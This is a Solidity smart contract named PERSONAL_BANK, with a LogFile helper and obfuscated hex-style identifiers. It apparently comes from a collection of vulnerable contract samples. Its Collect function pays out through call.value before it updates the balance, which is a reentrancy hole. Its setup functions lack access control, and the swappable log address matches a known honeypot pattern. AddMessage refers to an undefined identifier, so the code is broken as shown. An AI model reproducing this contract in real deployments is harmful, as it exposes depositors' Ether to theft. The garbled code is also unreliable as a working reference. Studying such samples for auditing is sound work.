pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public _0x9d69d1;

    uint public MinSum = 1 ether;

    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool _0x7c7849;

    function SetMinSum(uint _0xe5a236)
    public
    {
        if(_0x7c7849)revert();
        MinSum = _0xe5a236;
    }

    function SetLogFile(address _0xfee5dc)
    public
    {
        if(_0x7c7849)revert();
        Log = LogFile(_0xfee5dc);
    }

    function Initialized()
    public
    {
        _0x7c7849 = true;
    }

    function Deposit()
    public
    payable
    {
        _0x9d69d1[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,"Put");
    }

    function Collect(uint _0x6da34a)
    public
    payable
    {
        if(_0x9d69d1[msg.sender]>=MinSum && _0x9d69d1[msg.sender]>=_0x6da34a)
        {
            if(msg.sender.call.value(_0x6da34a)())
            {
                _0x9d69d1[msg.sender]-=_0x6da34a;
                Log.AddMessage(msg.sender,_0x6da34a,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        Deposit();
    }

}

contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address _0x543f41,uint _0xe5a236,string _0x0147ac)
    public
    {
        LastMsg.Sender = _0x543f41;
        LastMsg.Time = _0x85d03a;
        LastMsg.Val = _0xe5a236;
        LastMsg.Data = _0x0147ac;
        History.push(LastMsg);
    }
}